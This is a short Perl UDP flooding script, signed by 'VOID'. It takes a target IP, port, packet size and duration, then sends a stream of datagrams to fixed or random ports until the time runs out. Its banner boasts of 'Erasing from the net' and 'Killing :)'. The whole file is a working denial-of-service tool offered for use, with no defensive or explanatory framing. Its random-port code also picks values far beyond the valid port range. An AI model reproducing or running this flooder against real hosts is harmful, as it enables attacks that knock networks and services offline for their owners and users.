#!/usr/bin/perl

##
# Script by Void,the one and only...<----
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print <<EOTEXT;
*
   
     ▐░▌   ▐░▌     
      ▐░▌ ▐░▌      
       ▐░▐░▌       
        ▐░▌        
         ▀         
                   

			Made By VOID mystic



We are formed as one, we battle to live, this is are History
EOTEXT

print "::Get @ Me Random:: $ip " . ($port ? $port : "random") . " Erasing from the net = " .
  ($size ? "$size-byte" : "Killing :)") . " ~VOID~ " .
  ($time ? " for $time seconds" : "") . "\n";
print "Command stop with Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
